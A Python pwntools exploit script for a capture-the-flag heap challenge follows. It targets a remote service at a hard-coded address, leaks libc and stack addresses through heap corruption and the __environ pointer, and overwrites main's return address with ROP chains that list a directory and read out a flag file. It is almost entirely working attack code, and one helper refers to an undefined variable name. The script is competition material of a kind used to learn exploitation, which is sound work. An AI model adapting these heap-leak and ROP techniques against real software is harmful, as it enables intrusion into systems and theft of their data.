from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./acc_patched"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("65.109.199.182", 13373)


def ropgetdent(addr):
    rop = ROP(libc)
    syscall = rop.find_gadget(['syscall', 'ret'])[0]
    mov_rdi_rax = next(libc.search(asm("mov rdi, rax ; cmp rdx, rcx")))
    add_rdx_rax = next(libc.search(asm("add edx, eax ; mov rax, rdx ; pop rbx ; ret")))
    # xor_rdx = next(libc.search(asm("xor edx, edx ; mov eax, edx ; ret")))

    # Open
    rop.rax = constants.SYS_open
    rop.call(syscall, [addr, 0])

    # Getdent
    rop.raw(mov_rdi_rax)
    rop.rax = 0x200
    rop.rsi = addr
    rop.raw(add_rdx_rax)
    rop.raw(0xdeadbeef) # pop rbx, 无用
    rop.rax = constants.SYS_getdents64
    rop.raw(p64(syscall))

    # Write
    rop.rax = constants.SYS_write
    rop.call(syscall, [1, addr])

    return rop.chain()


def orw(addr, path=None):
    rop = ROP(libc)
    syscall = rop.find_gadget(['syscall', 'ret'])[0]
    mov_rdi_rax = next(libc.search(asm("mov rdi, rax; cmp rdx, rcx")))
    if path:
        mov_qword_ptr_rsi = next(libc.search(asm("mov qword ptr [rsi], rax ; ret")))
        path = path.ljust((len(path) + 7) & ~7, b"\x00")
        chunks = [path[i:i + 8] for i in range(0, len(path), 8)]
        for i, chunk in enumerate(chunks):
            rop.rsi = addr + i * 8
            rop.rax = chunk
            rop.call(mov_qword_ptr_rsi_rax)

    # Open
    rop.rax = constants.SYS_open
    rop.call(syscall, [addr, 0])
    rop.raw(mov_rdi_rax)

    # Read
    rop(rsi=addr)
    add_rdx_rax = next(libc.search(asm("add edx, eax ; mov rax, rdx ; pop rbx ; ret")))
    rop.rax = 0x100
    rop.raw(add_rdx_rax)
    rop.raw(0xdeadbeef) #pop rbx, 无用
    rop.rax = constants.SYS_read
    rop.raw(syscall)

    # Write
    rop.rax = constants.SYS_write
    rop.call(syscall, [1])

    return rop.chain()


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


def add(name, size, bio):
    io.sendlineafter("> ", "1")
    io.sendlineafter("username: ", name)
    io.sendlineafter("bio length (<= 4096): ", str(size))
    io.sendafter("bytes): ", bio)


def show(idx):
    io.sendlineafter("> ", "4")
    io.sendlineafter("index: ", str(idx))


def delete(idx):
    io.sendlineafter("> ", "5")
    io.sendlineafter("index: ", str(idx))


def edit(idx, bio):
    io.sendlineafter("> ", "2")
    io.sendlineafter("index: ", str(idx))
    io.sendafter(" bytes): ", bio)


def exit():
    io.sendlineafter("> ", "7")


users = 0x4060

# leak libc
add("tinyfat", 0x500, "t" * 0x500)
add("tinyfat2", 0x500, "a" * 0x500)
add("tinyfat3", 0x500, "a" * 0x500)
delete(1)
add("tinyfat", 0x430, "t" * 0x430)
show(1)

io.recvuntil("id=")
leak1 = int(io.recvuntil(" "))
# log.success("id :-----> " + hex(leak1))
io.recvuntil("user=")
leak2 = u16(io.recv(2))
# log.success("leak :-----> " + hex(leak2))
leak = (leak2 << 32) + leak1
log.success("leak :-----> " + hex(leak))
io.recvuntil("bio: ")
leak = u64(io.recv(6).ljust(8, b"\x00"))
libc.address = leak - 0x203b20
log.success("libc.address :-----> " + hex(libc.address))

# leak stack
add("t1", 0x38, "1" * 0x38) #5
add("t2", 0x1, "1")
add("t2", 0x39, "2" * 0x39)
delete(3)
add("t3", 0x1, "1")
environ = libc.symbols["__environ"]
add("t4", 0x38, b"3" * 0x28 + p64(8) + p64(environ))
show(5)
io.recvuntil("bio: ")
leak = u64(io.recv(6).ljust(8, b"\x00"))
log.success("stack :-----> " + hex(leak))
main_ret = leak - 0x130
log.success("main_ret :-----> " + hex(main_ret))

# getdent
payload = ropgetdent(main_ret + 0xc0) + b".\x00" # 获取远程flag文件名

# orw
filename = b"flag-2583a02920a04a40c8f817f5d7c2bff3\x00"
payload = orw(main_ret + 0xb0) + filename

edit(6, b"tinyfatt" * 5 + p64(len(payload)) + p64(main_ret))
edit(5, payload)

ddebug("breakrva 0x1830\n break free\n breakrva 0x001F31\n continue")
exit()

io.interactive()
